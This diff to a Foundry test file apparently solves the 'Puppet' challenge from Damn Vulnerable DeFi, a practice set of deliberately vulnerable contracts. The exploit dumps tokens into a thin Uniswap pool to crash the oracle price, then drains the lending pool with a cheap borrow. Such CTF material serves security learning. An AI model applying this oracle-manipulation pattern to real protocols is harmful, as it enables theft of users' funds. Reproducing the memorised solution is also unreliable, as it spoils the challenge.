@@ -3,6 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
@@ -117,8 +118,25 @@ contract Puppet is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
+    // The uniswap liquidity pool is too small relative to the attacker's balance.
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+
+        // See when the attacker dump dvt in the pool.
+        uint256 ethOut = uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE);
+        console.log('ethOut: ', ethOut); // about 9.9 ether, i.e. 0.1 ether in the pool
+
+        // Dump!
+        dvt.approve(address(uniswapExchange), type(uint256).max);
+        uniswapExchange.tokenToEthSwapInput(1000 ether, 1, DEADLINE);
+
+        // The dvt price is less than 0.0001 ether, so we can borrow 100_000 dvt with 20 ether
+        uint256 oraclePrice = computeOraclePrice();
+        console.log('oraclePrice: ', oraclePrice);
+
+        puppetPool.borrow{ value: 20 ether }(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
@@ -140,5 +158,11 @@ contract Puppet is Test {
         uint256 numerator = input_amount_with_fee * output_reserve;
         uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
         return numerator / denominator;
+    }
+
+    // Copied from PuppetPool.sol
+    function computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap pair
+        return (address(uniswapExchange).balance * (10**18)) / dvt.balanceOf(address(uniswapExchange));
     }
 }
